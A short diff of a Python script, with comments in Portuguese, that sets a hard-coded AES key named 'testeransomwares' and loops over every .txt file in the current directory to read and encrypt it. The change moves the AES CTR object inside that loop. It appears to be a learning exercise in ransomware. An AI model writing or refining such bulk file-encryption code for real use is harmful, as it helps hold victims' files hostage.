@@ -3,8 +3,7 @@ import glob
 import pyaes
 
 ## chave de criptografia
-key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
+key = b'testeransomwares'
 
 ## Obtém o caminho completo para o diretório atual
 diretorio = os.environ['PWD']
@@ -14,6 +13,8 @@ lista_arquivos = list(glob.iglob(f'{diretorio}/*.txt'))
 
 ## Processa cada um dos arquivos da lista
 for nome_arquivo in lista_arquivos:
+    ## Cria uma nova instância do pyaes
+    aes = pyaes.AESModeOfOperationCTR(key)
     ## Lê os dados do arquivo original
     arquivo = open(nome_arquivo, "rb")
     dados = arquivo.read()
